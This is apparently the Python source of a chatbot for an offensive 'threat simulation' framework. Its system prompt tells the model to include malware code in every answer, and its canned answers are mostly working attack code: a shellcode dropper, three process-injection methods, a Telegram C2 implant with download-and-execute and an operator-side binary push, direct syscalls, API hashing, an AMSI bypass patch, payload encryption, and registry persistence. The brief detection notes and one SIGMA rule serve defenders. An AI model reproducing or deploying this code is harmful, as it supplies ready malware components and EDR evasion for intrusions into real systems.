"""
peekaboo AI chatbot
supports: Claude (Anthropic), Gemini (Google), local Ollama (RAG)
knowledge base: ~/hacking/meow local codebase + semantic post index
focused on: C2 channels, binary delivery, malware dev, threat simulation
"""
from __future__ import annotations
import json
import os
import urllib.request
from pathlib import Path
from typing import Generator

KB_FILE    = Path(__file__).parent / "knowledge_base.json"
CONFIG_DIR = Path(__file__).parent.parent / "config"

CLAUDE_MODEL = "claude-opus-4-6"
GEMINI_MODEL_DEFAULT = "gemini-2.0-flash"
OLLAMA_MODEL_DEFAULT = "qwen3:1.7b"

# -- system prompt --------------------------------------------------------------
_SYSTEM_BASE = """You are Peekaboo AI - a high-end technical and educational assistant for the Peekaboo Threat Simulation Framework, created by Zhassulan Zhussupov (@cocomelonc).

Your primary goal is to bridge the gap between offensive research, practice and defensive implementation. You analyze the ~/hacking/meow codebase to explain how adversarial techniques operate at the binary and kernel levels.

Your knowledge is grounded in the ~/hacking/meow codebase - real, working code covering:
- **C2 (Command & Control) channels**: GitHub Issues/Comments, Telegram webhooks, Bitbucket, VirusTotal, Discord/Slack abuse
- **Binary delivery via C2**: how implants receive and execute dropped payloads from C2 servers
- **Process injection**: VirtualAllocEx, EnumDesktopsA callbacks, APC injection, and more
- **Payload encryption/obfuscation**: Speck, FEAL-8, Lucifer, MARS, Treyfer, custom XOR
- **Windows persistence**: Registry Run keys, Winlogon, DLL hijacking, scheduled tasks
- **AV/EDR bypass techniques**: syscalls, API hashing, string encryption, unhooking
- **Stealer/exfiltration**: collecting system info and exfiltrating via covert channels
- **Detection engineering**: how blue teams detect these techniques (telemetry, SIGMA rules)
- **MITRE ATT&CK mapping**: TTP mapping for each technique

The Peekaboo framework currently supports:
- Crypto: Speck, FEAL-8, Lucifer, MARS, Treyfer, Camellia, A5/1, CAST128, DES, Madryga, Khufu, LOKI, RC5, RC6, SAFER, Skipjack, TEA (Tiny Encryption Algorithm), XTEA 
- Injection: VirtualAllocEx, EnumDesktopsA
- Persistence: Registry Run, Winlogon, Screensaver Hijacking, File Type Hijacking
- C2/Stealer: Angelcam, Azure, Telegram, GitHub, Bitbucket, VirusTotal

## C2 binary delivery (key topic for demos):
C2 binary drop/delivery means the attacker infrastructure pushes a payload to the victim:
- **Telegram**: bot sends binary file via sendDocument API; victim checks for new docs
- **GitHub**: implant polls Issues/Releases/Gists for new payload; downloads via raw URL
- **Bitbucket**: implant polls repo for new commits containing encoded payloads
- **VirusTotal**: creative abuse - encode command/payload in file metadata or comments
- **Discord/Slack webhooks**: outbound-only but can host files for retrieval

Always frame content as **educational and defensive** - help researchers understand:
1. How the technique works mechanically
2. What telemetry it generates (what defenders can detect)
3. Which MITRE ATT&CK techniques apply
4. How to detect/prevent it in a blue team context

Be direct, technical, and practical. Reference specific topic directories (e.g. 2021-09-19-injection-1) when relevant.
Avoid vague explanations - give concrete details about APIs, memory layouts, WinAPI calls, and actual code from the knowledge base.

## CRITICAL - mandatory response rules (follow these on EVERY response, no exceptions):

1. **Always include at least one code snippet.** Pull from the knowledge base context when available. If the KB has matching code, show it verbatim or adapted - never paraphrase code in words when you can show the actual implementation.
2. **Use fenced code blocks with a language tag** - ` ```c `, ` ```cpp `, ` ```python `, ` ```nim `, ` ```asm ` etc. Never put code inline without a fence.
3. **Structure every technical answer** in this order:
   - Brief explanation (1-3 sentences)
   - Code snippet from KB (or a representative example in the style of the codebase)
   - MITRE ATT&CK ID(s) if applicable
   - Detection / telemetry note (one line minimum)
4. **Cite the source slug** when using KB code (e.g. `maldev-1`, `injection-2`, `pers-1`).
5. If a question is completely non-technical (greetings, meta questions), skip the code section but still be concise and direct.
"""


# -- config loaders -------------------------------------------------------------

def _get_anthropic_key() -> str:
    cfg_path = CONFIG_DIR / "anthropic_config.json"
    if cfg_path.exists():
        try:
            data = json.loads(cfg_path.read_text())
            key = data.get("api_key", "")
            if key and not key.startswith("sk-ant-xxx"):
                return key
        except Exception:
            pass
    return os.environ.get("ANTHROPIC_API_KEY", "")


def _get_gemini_config() -> tuple[str, str]:
    """Returns (api_key, model)."""
    cfg_path = CONFIG_DIR / "gemini_config.json"
    if cfg_path.exists():
        try:
            data = json.loads(cfg_path.read_text())
            key   = data.get("api_key", "")
            model = data.get("model", GEMINI_MODEL_DEFAULT)
            if key and not key.startswith("AIzaxxx"):
                return key, model
        except Exception as e:
            print ("get gemini config: ", str(e))
    return os.environ.get("GEMINI_API_KEY", ""), GEMINI_MODEL_DEFAULT


def _get_ollama_config() -> dict:
    cfg_path = CONFIG_DIR / "ollama_config.json"
    defaults = {
        "base_url":      "http://localhost:11434",
        "model":         OLLAMA_MODEL_DEFAULT,
        "temperature":   0.6,
        "context_posts": 6,
    }
    if cfg_path.exists():
        try:
            defaults.update(json.loads(cfg_path.read_text()))
        except Exception:
            pass
    return defaults


# -- knowledge base -------------------------------------------------------------

def _load_knowledge_base() -> str:
    if not KB_FILE.exists():
        return ""
    try:
        kb = json.loads(KB_FILE.read_text())
        posts = kb.get("posts", [])
        if not posts:
            return ""
        lines = [
            f"\n\n## Knowledge Base: {kb.get('author', '')}",
            f"Source: {kb.get('source', '')}",
            f"Topics indexed: {len(posts)}",
            "---",
        ]
        budget, used = 80_000, 0
        for p in posts:
            ref = p.get("ref") or p.get("url", "")
            chunk = f"\n### {p['title']}\nRef: {ref}\n{p['content']}\n"
            if used + len(chunk) > budget:
                break
            lines.append(chunk)
            used += len(chunk)
        return "\n".join(lines)
    except Exception:
        return ""


def _build_claude_system() -> list[dict] | str:
    """System prompt with optional prompt-cached KB block for Claude."""
    kb_text = _load_knowledge_base()
    if not kb_text:
        return _SYSTEM_BASE
    return [
        {"type": "text", "text": _SYSTEM_BASE},
        {"type": "text", "text": kb_text, "cache_control": {"type": "ephemeral"}},
    ]


def _build_gemini_system() -> str:
    """Single system string for Gemini (no block format)."""
    kb_text = _load_knowledge_base()
    if not kb_text:
        return _SYSTEM_BASE
    return _SYSTEM_BASE + kb_text


# -- Claude streaming -----------------------------------------------------------

def _stream_claude(messages: list[dict]) -> Generator[str, None, None]:
    import anthropic

    api_key = _get_anthropic_key()
    if not api_key:
        yield "[=^..^=] Anthropic API key not set. Add it to config/anthropic_config.json"
        return

    yield {"status": "connecting", "msg": "connecting to Claude…"}
    client = anthropic.Anthropic(api_key=api_key)
    try:
        yield {"status": "generating", "msg": "generating response…"}
        with client.messages.stream(
            model=CLAUDE_MODEL,
            max_tokens=2048,
            system=_build_claude_system(),
            messages=messages,
            thinking={"type": "adaptive"},
        ) as stream:
            for text in stream.text_stream:
                yield text
    except anthropic.AuthenticationError:
        yield "[=^..^=] Invalid Anthropic API key. Check config/anthropic_config.json"
    except anthropic.APIConnectionError:
        yield "[=^..^=] Anthropic connection error. Check your internet."
    except Exception as e:
        yield f"[=^..^=] Claude error: {e}"


# -- Gemini streaming -----------------------------------------------------------

def _stream_gemini(messages: list[dict]) -> Generator[str, None, None]:
    from google import genai
    from google.genai import types

    api_key, model = _get_gemini_config()
    if not api_key:
        yield "[=^..^=] Gemini API key not set. Add it to config/gemini_config.json"
        return

    # convert messages to Gemini Content format
    contents = []
    for m in messages:
        role = "user" if m["role"] == "user" else "model"
        contents.append(types.Content(role=role, parts=[types.Part(text=m["content"])]))

    yield {"status": "connecting", "msg": "connecting to Gemini…"}
    client = genai.Client(api_key=api_key)
    try:
        yield {"status": "generating", "msg": "generating response…"}
        response = client.models.generate_content_stream(
            model=model,
            contents=contents,
            config=types.GenerateContentConfig(
                system_instruction=_build_gemini_system(),
                max_output_tokens=2048,
                temperature=0.7,
            ),
        )
        for chunk in response:
            if chunk.text:
                yield chunk.text
    except Exception as e:
        err = str(e)
        if "API_KEY_INVALID" in err or "API key" in err:
            yield f"[=^..^=] Invalid Gemini API key. Check config/gemini_config.json"
        else:
            yield f"[=^..^=] Gemini error: {e}"


# -- Ollama RAG streaming -------------------------------------------------------

def _rag_context(question: str, n: int = 6) -> str:
    """Retrieve top-n relevant posts via semantic search, return formatted context block."""
    try:
        import sys, os
        sys.path.insert(0, os.path.dirname(__file__))
        from semantic import find_related_posts
        posts = find_related_posts(question, max_results=n)
    except Exception as e:
        print(f"[ollama] rag retrieval error: {e}")
        return ""

    if not posts:
        return ""

    blocks = []
    for p in posts:
        title    = p.get("title", "")
        url      = p.get("blog_url", "")
        cat      = p.get("category", "")
        aids     = ", ".join(p.get("attack_ids", []))
        score    = p.get("score", 0)
        # try to get the code snippet from library cache
        snippet  = _get_snippet_for_post(p)
        block = f"### {title}\n- URL: {url}\n- Category: {cat}"
        if aids:
            block += f"\n- ATT&CK: {aids}"
        block += f"\n- Relevance: {score:.0%}"
        if snippet:
            block += f"\n\n```c\n{snippet}\n```"
        blocks.append(block)

    return "\n\n".join(blocks)


_library_cache: list[dict] | None = None

def _get_library() -> list[dict]:
    global _library_cache
    if _library_cache is not None:
        return _library_cache
    lc = Path(__file__).parent.parent / "data" / "library_cache.json"
    if lc.exists():
        try:
            _library_cache = json.loads(lc.read_text())
            return _library_cache
        except Exception:
            pass
    _library_cache = []
    return _library_cache


def _get_snippet_for_post(post: dict) -> str:
    """Look up a code snippet from library_cache by slug."""
    slug = post.get("slug") or post.get("title", "")
    if not slug:
        return ""
    for entry in _get_library():
        if entry.get("slug") == slug:
            snip = entry.get("snippet", "")
            if snip:
                lines = snip.splitlines()[:35]
                return "\n".join(lines)
    return ""


def _build_ollama_system(context: str) -> str:
    # /no_think disables qwen3 extended thinking mode
    base = "/no_think\n\n" + _SYSTEM_BASE
    if context:
        base += f"""

## Retrieved knowledge base context (most relevant to this question):

{context}

Use this context to give precise, code-grounded answers. Reference blog URLs when citing examples.
"""
    return base


def _stream_ollama(messages: list[dict]) -> Generator[str, None, None]:
    cfg = _get_ollama_config()
    base_url = cfg["base_url"].rstrip("/")
    model    = cfg["model"]
    temp     = cfg.get("temperature", 0.6)
    n_ctx    = cfg.get("context_posts", 6)

    # RAG: embed the latest user message to retrieve context
    last_user = next(
        (m["content"] for m in reversed(messages) if m.get("role") == "user"), ""
    )
    yield {"status": "rag", "msg": "searching knowledge base…"}
    context = _rag_context(last_user, n=n_ctx) if last_user else ""
    yield {"status": "generating", "msg": f"sending to {model}…"}

    system_prompt = _build_ollama_system(context)

    payload = json.dumps({
        "model":   model,
        "stream":  True,
        "think":   False,          # disable extended thinking for qwen3
        "options": {"temperature": temp, "num_predict": 2048},
        "messages": [{"role": "system", "content": system_prompt}] + messages,
    }).encode()

    url = f"{base_url}/api/chat"
    try:
        req = urllib.request.Request(
            url, data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=300) as resp:
            # qwen3 emits thinking tokens ending with </think> before the real answer
            tokens: list[str] = []
            past_think = False
            emitted_thinking_event = False
            for raw_line in resp:
                line = raw_line.decode("utf-8").strip()
                if not line:
                    continue
                try:
                    chunk = json.loads(line)
                    token = chunk.get("message", {}).get("content", "")
                    if token:
                        if past_think:
                            yield token
                        else:
                            if not emitted_thinking_event:
                                yield {"thinking": True}
                                emitted_thinking_event = True
                            tokens.append(token)
                            joined = "".join(tokens)
                            if "</think>" in joined:
                                past_think = True
                                yield {"thinking": False}
                                after = joined.split("</think>", 1)[1]
                                tokens = []
                                if after:
                                    yield after
                    if chunk.get("done"):
                        if not past_think:
                            if emitted_thinking_event:
                                yield {"thinking": False}
                            yield "".join(tokens)
                        break
                except json.JSONDecodeError:
                    continue
    except urllib.error.URLError as e:
        yield f"[=^..^=] Ollama connection error: {e}. Is Ollama running?"
    except Exception as e:
        yield f"[=^..^=] Ollama error: {e}"


def _ollama_available() -> tuple[bool, str]:
    cfg = _get_ollama_config()
    base_url = cfg["base_url"].rstrip("/")
    model    = cfg["model"]
    try:
        req = urllib.request.Request(f"{base_url}/api/tags", method="GET")
        with urllib.request.urlopen(req, timeout=3) as resp:
            data = json.loads(resp.read())
            names = [m["name"] for m in data.get("models", [])]
            if any(model.split(":")[0] in n for n in names):
                return True, model
            return False, f"{model} not pulled"
    except Exception:
        return False, "ollama offline"


# -- canned answers for demo speed ---------------------------------------------

_CANNED: list[tuple[str, str]] = [
    # -- What is Peekaboo ------------------------------------------------------
    (
        r"what is peekaboo|what('s| is) this (framework|tool|project)|explain peekaboo",
        """## Peekaboo - APT Simulation Framework

**Peekaboo** is an open-source threat simulation and malware development research framework by **@cocomelonc**, designed to bridge offensive research with defensive implementation.

### Capabilities at a glance

| Category | Techniques | Examples |
|---|---|---|
| **C2 channels** | T1102, T1071 | Telegram bot, GitHub Issues, Bitbucket, VirusTotal abuse |
| **Process injection** | T1055 | VirtualAllocEx, EnumDesktopsA, APC, DLL hollowing |
| **AV/EDR bypass** | T1027, T1562 | Direct syscalls, API hashing, AMSI patch, unhooking |
| **Payload crypto** | T1027, T1140 | Speck, FEAL-8, MARS, Treyfer, Lucifer, TEA, XTEA |
| **Persistence** | T1547, T1574 | Registry Run, Winlogon, DLL hijacking, screensaver |
| **Exfiltration** | T1041 | Stealer + C2 channel combo |

### Minimal XOR shellcode dropper (starter template)

```c
#include <windows.h>

// msfvenom -p windows/x64/exec CMD=calc.exe -f c
unsigned char sc[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00...";
unsigned char key[] = "\xde\xad\xbe\xef\x13\x37\xc0\xde";

void xor_crypt(unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= key[i % sizeof(key)];
}

int main(void) {
    xor_crypt(sc, sizeof(sc));
    LPVOID mem = VirtualAlloc(NULL, sizeof(sc),
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(mem, sc, sizeof(sc));
    ((void(*)())mem)();
    return 0;
}
```

Every module ships with a matching blog post explaining mechanics, telemetry, and SIGMA detection rules. Use the **Module Library** panel to browse all techniques, or **PE Inspector** to analyse compiled samples.

**MITRE:** T1059.003, T1027, T1106"""
    ),

    # -- Process Injection -----------------------------------------------------
    (
        r"process inject|injection technique|virtualalloc|enumerate desktop|apc inject",
        """## Process Injection Techniques

Peekaboo covers five injection primitives - each with a different EDR detection profile.

---

### 1. Classic VirtualAllocEx + CreateRemoteThread (`injection-1`) - T1055.001

The textbook injection. Heavily monitored but still effective against legacy EDRs.

```c
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);

// allocate an RWX page inside the target process
LPVOID mem = VirtualAllocEx(hProc, NULL, payload_len,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE);
// write shellcode across process boundary
WriteProcessMemory(hProc, mem, payload, payload_len, NULL);

// kick a remote thread at that address
CreateRemoteThread(hProc, NULL, 0,
                   (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
CloseHandle(hProc);
```

**Detection:** Sysmon EID 10 (`OpenProcess`) + EID 8 (`CreateRemoteThread`) on the same target PID.

---

### 2. EnumDesktopsA callback (`injection-2`) - T1055.012

Shellcode runs inside a legitimate `user32.dll` callback - no remote thread created.

```c
LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
                          MEM_COMMIT | MEM_RESERVE,
                          PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, my_payload, sizeof(my_payload));

// Windows calls mem() as a callback for each desktop name
EnumDesktopsA(GetProcessWindowStation(),
              (DESKTOPENUMPROCA)mem, (LPARAM)NULL);
```

**Detection:** `VirtualAlloc(RWX)` immediately followed by `EnumDesktopsA` - unusual pair; Sysmon EID 7 (ImageLoad) won't fire, but memory-scanning EDRs can catch the RWX page.

---

### 3. APC Injection (`injection-3`) - T1055.004

Queues shellcode as an Asynchronous Procedure Call into an alertable thread.

```c
HANDLE hProc   = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS,   FALSE, tid);

// write payload into target address space
LPVOID mem = VirtualAllocEx(hProc, NULL, payload_len,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, mem, payload, payload_len, NULL);

// queue APC - fires when thread enters alertable wait
// (SleepEx, WaitForSingleObjectEx, MsgWaitForMultipleObjectsEx)
QueueUserAPC((PAPCFUNC)mem, hThread, NULL);

// if target thread is suspended, resume it so APC fires
ResumeThread(hThread);
```

**Detection:** `QueueUserAPC` targeting threads in remote processes; use ETW provider `Microsoft-Windows-Kernel-Process` - Sysmon doesn't log this natively.

---

**MITRE coverage:** T1055, T1055.001, T1055.004, T1055.012"""
    ),

    # -- Telegram C2 ----------------------------------------------------------
    (
        r"telegram c2|telegram bot|c2 channel|command and control",
        """## Telegram C2 Channel (`c2-telegram-1`)

Peekaboo uses Telegram's Bot API as a covert C2 channel - all traffic is legitimate HTTPS to `api.telegram.org`.

### Architecture

```
Operator --[sendMessage / sendDocument]--► Telegram Bot API
                                                 │
Implant ◄--[getUpdates long-poll, 30 s]----------┘
```

### Implant polling loop (C)

```c
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

#define TOKEN    "7123456789:AAF-xxxxxxxxxxxxxxxxxxxx"
#define BASE_URL "https://api.telegram.org/bot" TOKEN

void c2_loop(void) {
    HINTERNET hNet = InternetOpen("Mozilla/5.0",
                                   INTERNET_OPEN_TYPE_DIRECT,
                                   NULL, NULL, 0);
    long last_id = 0;
    char url[512];

    while (1) {
        // long-poll: blocks up to 30 s, returns only new updates
        snprintf(url, sizeof(url),
            BASE_URL "/getUpdates?offset=%ld&timeout=30", last_id + 1);

        HINTERNET hConn = InternetOpenUrlA(
            hNet, url, NULL, 0,
            INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);

        if (hConn) {
            char buf[8192] = {0};
            DWORD n = 0;
            InternetReadFile(hConn, buf, sizeof(buf) - 1, &n);
            // parse JSON: extract update_id + message.text
            // "!drop" => download and exec binary attachment
            process_update(buf, &last_id);
            InternetCloseHandle(hConn);
        }
        Sleep(5000);
    }
}
```

### Binary delivery - operator side (Python)

```python
import requests

TOKEN   = "7123456789:AAF-xxxxxxxxxxxxxxxxxxxx"
CHAT_ID = "-100123456789"

def drop_binary(path: str, caption: str = "update.exe") -> None:
    url  = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    data = {"chat_id": CHAT_ID, "caption": caption}
    with open(path, "rb") as f:
        r = requests.post(url, data=data, files={"document": f})
    print("sent:", r.json().get("ok"))

drop_binary("builds/implant_enc.exe")
```

**Why it evades detection:**
- Traffic is valid HTTPS to `api.telegram.org` (widely whitelisted CDN)
- No custom C2 domain - nothing to blocklist
- Beaconing interval jitter mimics human interaction

**MITRE:** T1102 (Web Service), T1071.001 (App Layer Protocol), T1105 (Ingress Tool Transfer)

**Detection:** Sysmon EID 3 - network connections to `api.telegram.org` from non-Telegram processes; consistent beaconing interval (e.g., every 5 s exactly); `InternetOpenUrlA` call stack tracing via ETW."""
    ),

    # -- AV / EDR Bypass -------------------------------------------------------
    (
        r"av evasion|edr bypass|antivirus|defender|amsi|syscall|evasion",
        """## AV/EDR Bypass Layers

Peekaboo layers three primitives to reduce the EDR telemetry footprint.

---

### 1. Direct Syscalls (`evasion-syscall-1`) - T1106, T1562.001

Most EDRs hook `ntdll.dll` exports in userland. Direct syscalls jump straight to the kernel, bypassing all hooks.

```c
// Step 1 - extract the syscall stub number (SSN) from ntdll at runtime
DWORD get_ssn(const char *func_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE   *fn    = (BYTE *)GetProcAddress(ntdll, func_name);
    // un-hooked ntdll stub layout (x64):
    //   4C 8B D1        mov r10, rcx
    //   B8 XX 00 00 00  mov eax, <SSN>
    if (fn[0] == 0x4c && fn[1] == 0x8b && fn[2] == 0xd1)
        return *(DWORD *)(fn + 4);
    // hooked? look for jmp trampoline, scan forward for the real stub
    return 0;
}

// Step 2 - inline asm stub for NtAllocateVirtualMemory (SSN = 0x18 on Win10)
__asm__(
    "NtAllocVirt:          \n"
    "  mov  r10, rcx       \n"   // calling convention: rcx -> r10
    "  mov  eax, 0x18      \n"   // syscall number
    "  syscall             \n"
    "  ret                 \n"
);
```

---

### 2. API Hashing (`evasion-hash-1`) - T1027.007

Resolve WinAPI functions by hash at runtime - no function name strings in the binary.

```c
// FNV-1a 32-bit hash
static DWORD fnv1a(const char *s) {
    DWORD h = 0x811c9dc5;
    while (*s) h = (h ^ (BYTE)*s++) * 0x01000193;
    return h;
}

// walk kernel32.dll EAT and resolve by hash
FARPROC resolve_by_hash(DWORD target) {
    HMODULE base = GetModuleHandleA("kernel32.dll");
    auto   *dos  = (IMAGE_DOS_HEADER *)base;
    auto   *nt   = (IMAGE_NT_HEADERS *)((BYTE*)base + dos->e_lfanew);
    auto   *exp  = (IMAGE_EXPORT_DIRECTORY *)
        ((BYTE*)base + nt->OptionalHeader
            .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD*)((BYTE*)base + exp->AddressOfNames);
    WORD  *ords  = (WORD *) ((BYTE*)base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD*)((BYTE*)base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (char*)((BYTE*)base + names[i]);
        if (fnv1a(name) == target)
            return (FARPROC)((BYTE*)base + funcs[ords[i]]);
    }
    return NULL;
}

// usage - no string "VirtualAlloc" appears in binary
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID,SIZE_T,DWORD,DWORD);
auto VAlloc = (pVirtualAlloc)resolve_by_hash(0xd983e4a4);
```

---

### 3. AMSI Patch (`evasion-amsi-1`) - T1562.001

Overwrite the `AmsiScanBuffer` prologue to force `AMSI_RESULT_CLEAN` - disables PowerShell/VBScript scanning without unloading the DLL.

```c
void patch_amsi(void) {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    BYTE   *fn   = (BYTE *)GetProcAddress(amsi, "AmsiScanBuffer");

    // patch 6 bytes: mov eax, E_INVALIDARG (0x80070057) ; ret
    // AMSI callers treat any non-S_OK return as "clean"
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

    DWORD old = 0;
    VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(fn, patch, sizeof(patch));
    VirtualProtect(fn, sizeof(patch), old, &old);
}
```

**Detection:**
- `VirtualProtect` calls targeting `amsi.dll` address range - high signal
- Memory integrity scan of `amsi.dll` in running processes
- ETW `Microsoft-Windows-AMSI/Operational` log - EID 1101 scan suppressed
- RWX pages in non-system processes (catch-all)"""
    ),

    # -- Payload Encryption ---------------------------------------------------
    (
        r"encrypt|encryption|speck|feal|mars|treyfer|xor|crypto|cipher|tea\b|xtea",
        """## Payload Encryption

Peekaboo uses lightweight block ciphers to encrypt shellcode. All run in pure userland - zero CryptoAPI calls.

---

### XOR - baseline (simplest)

```c
void xor_crypt(unsigned char *buf, size_t len,
               const unsigned char *key, size_t klen) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= key[i % klen];
}

unsigned char key[]     = "\xde\xad\xbe\xef\x13\x37\xc0\xde";
unsigned char payload[] = { /* encrypted bytes */ };
xor_crypt(payload, sizeof(payload), key, sizeof(key));
// then VirtualAlloc + execute...
```

---

### Speck-64/128 (`crypto-speck-1`) - NSA lightweight cipher

Fast on ARM/x86; 27 rounds; 64-bit block, 128-bit key.

```c
#include <stdint.h>
#define SPECK_ROUNDS 27
#define ROR64(x,r) (((x)>>(r))|((x)<<(64-(r))))
#define ROL64(x,r) (((x)<<(r))|((x)>>(64-(r))))

void speck_expand(const uint64_t key[2], uint64_t rk[SPECK_ROUNDS]) {
    uint64_t a = key[1], b = key[0];
    rk[0] = b;
    for (int i = 0; i < SPECK_ROUNDS - 1; i++) {
        a = (ROR64(a, 8) + b) ^ i;
        b =  ROL64(b, 3)      ^ a;
        rk[i + 1] = b;
    }
}

void speck_encrypt(uint64_t *x, uint64_t *y,
                   const uint64_t rk[SPECK_ROUNDS]) {
    for (int i = 0; i < SPECK_ROUNDS; i++) {
        *x  = (ROR64(*x, 8) + *y) ^ rk[i];
        *y  =  ROL64(*y, 3)       ^ *x;
    }
}

// encrypt shellcode buffer in 8-byte blocks
void speck_encrypt_buf(uint8_t *buf, size_t len,
                       const uint64_t key[2]) {
    uint64_t rk[SPECK_ROUNDS];
    speck_expand(key, rk);
    for (size_t i = 0; i + 8 <= len; i += 8)
        speck_encrypt((uint64_t*)(buf+i),
                      (uint64_t*)(buf+i+4), rk);
}
```

---

### TEA - Tiny Encryption Algorithm (`crypto-tea-1`)

64-bit block, 128-bit key; 32 Feistel rounds; 15 lines of C.

```c
#include <stdint.h>

void tea_encrypt(uint32_t v[2], const uint32_t k[4]) {
    uint32_t v0 = v[0], v1 = v[1], sum = 0;
    const uint32_t delta = 0x9e3779b9;
    for (int i = 0; i < 32; i++) {
        sum += delta;
        v0  += ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
        v1  += ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
    }
    v[0] = v0; v[1] = v1;
}

void tea_decrypt(uint32_t v[2], const uint32_t k[4]) {
    uint32_t v0 = v[0], v1 = v[1];
    uint32_t sum = 0xC6EF3720;  // delta * 32
    const uint32_t delta = 0x9e3779b9;
    for (int i = 0; i < 32; i++) {
        v1  -= ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
        v0  -= ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
        sum -= delta;
    }
    v[0] = v0; v[1] = v1;
}
```

**MITRE:** T1027 (Obfuscated Files or Information), T1140 (Deobfuscate/Decode at Runtime)

**Detection:** Entropy analysis - encrypted blobs have Shannon entropy > 7.0 (vs ~4.5 for plaintext code). Tools: `binwalk -E`, Detect-It-Easy (die), PE-bear entropy view, YARA rules for high-entropy `.text` sections."""
    ),

    # -- MITRE ATT&CK ---------------------------------------------------------
    (
        r"mitre att.?ck|mitre\b|att&ck|\bttps?\b|tactic\b|t1\d{3}",
        """## MITRE ATT&CK Coverage

### Technique mapping

| Tactic | ID | Name | Peekaboo module |
|---|---|---|---|
| Execution | T1059.003 | Windows Command Shell | shellcode runners |
| Execution | T1106 | Native API | syscall modules |
| Persistence | T1547.001 | Registry Run Keys | malware-pers-1 |
| Persistence | T1547.004 | Winlogon Helper DLL | malware-pers-2 |
| Persistence | T1574.001 | DLL Search Order Hijacking | malware-pers-3 |
| Defense Evasion | T1027 | Obfuscated Files | crypto-* |
| Defense Evasion | T1027.007 | Dynamic API Resolution | evasion-hash |
| Defense Evasion | T1055.001 | Virtual Memory Injection | injection-1 |
| Defense Evasion | T1055.004 | APC Injection | injection-3 |
| Defense Evasion | T1055.012 | Process Hollowing | injection-2 |
| Defense Evasion | T1562.001 | Disable/Modify Tools | evasion-amsi |
| C2 | T1071.001 | Web Protocols | telegram, github |
| C2 | T1102 | Web Service | telegram, bitbucket |
| Exfiltration | T1041 | C2 channel exfil | stealer modules |

### SIGMA rule - Registry Run key persistence

```yaml
title: Suspicious Registry Run Key Written by Non-Standard Process
status: experimental
logsource:
    category: registry_set
    product: windows
detection:
    selection:
        EventType: SetValue
        TargetObject|contains:
            - 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            - 'Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
        Details|endswith:
            - '.exe'
            - '.dll'
            - '.bat'
    filter_legit:
        Image|startswith:
            - 'C:\\Program Files\\'
            - 'C:\\Windows\\System32\\'
            - 'C:\\Windows\\SysWOW64\\'
    condition: selection and not filter_legit
falsepositives:
    - Software installers writing Run keys from temp dirs
level: medium
tags:
    - attack.persistence
    - attack.t1547.001
```

Use the **MITRE ATT&CK** panel to browse all 150+ technique groups and see which modules have ✓ coverage."""
    ),

    # -- Persistence -----------------------------------------------------------
    (
        r"persistence|registry|run key|winlogon|startup|dll hijack|screensaver",
        """## Persistence Techniques

Four primitives with escalating stealth - from noisy Run keys to silent DLL hijacks.

---

### 1. Registry Run Key (`malware-pers-1`) - T1547.001

Easiest and noisiest. Executes implant on every user logon.

```c
#include <windows.h>

BOOL set_run_key(const char *name, const char *path) {
    HKEY  hKey;
    LONG  res = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
        0, KEY_SET_VALUE, &hKey);
    if (res != ERROR_SUCCESS) return FALSE;

    res = RegSetValueExA(hKey, name, 0, REG_SZ,
                         (const BYTE *)path, strlen(path) + 1);
    RegCloseKey(hKey);
    return res == ERROR_SUCCESS;
}

// payload lives in a plausible-looking location
set_run_key("WindowsDefenderUpdate",
    "C:\\\\Users\\\\Public\\\\svchost32.exe");
```

**Detection:** Sysmon EID 13 (Registry value set) on `CurrentVersion\\Run`.

---

### 2. Winlogon Helper DLL (`malware-pers-2`) - T1547.004

Requires admin. Injects into Winlogon shell on every interactive logon.

```c
// read current shell value, append implant
HKEY  hKey;
char  current[512] = {0};
DWORD sz = sizeof(current);
RegOpenKeyExA(HKEY_LOCAL_MACHINE,
    "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon",
    0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);

RegQueryValueExA(hKey, "Shell", NULL, NULL,
                 (BYTE*)current, &sz);

// append path - Windows executes both
char newval[600];
snprintf(newval, sizeof(newval),
         "%s,C:\\\\ProgramData\\\\evil.exe", current);
RegSetValueExA(hKey, "Shell", 0, REG_SZ,
               (BYTE*)newval, strlen(newval) + 1);
RegCloseKey(hKey);
```

